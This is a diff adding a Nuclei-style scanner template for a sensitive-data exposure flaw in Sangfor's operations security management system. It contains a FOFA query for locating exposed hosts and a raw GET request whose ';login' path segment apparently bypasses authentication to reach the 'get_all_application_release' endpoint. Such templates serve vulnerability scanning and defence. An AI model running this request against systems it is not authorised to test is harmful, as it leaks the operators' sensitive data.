@@ -1,0 +1,25 @@
+id: sangfor-om-get_all_application_release-info-leak
+
+info:
+  name: 深信服运维安全管理系统 get_all_application_release 接口敏感数据暴露漏洞
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: body="/fort/login" && header="FORTSESSIONID"
+  tags: 深信服运维安全管理系统
+
+http:
+- raw:
+  - |
+    GET /fort;login/app/get_all_application_release HTTP/1.1
+    Host: {{Hostname}}
+    Accept-Encoding: gzip
+    Connection: keep-alive
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'fortApp'
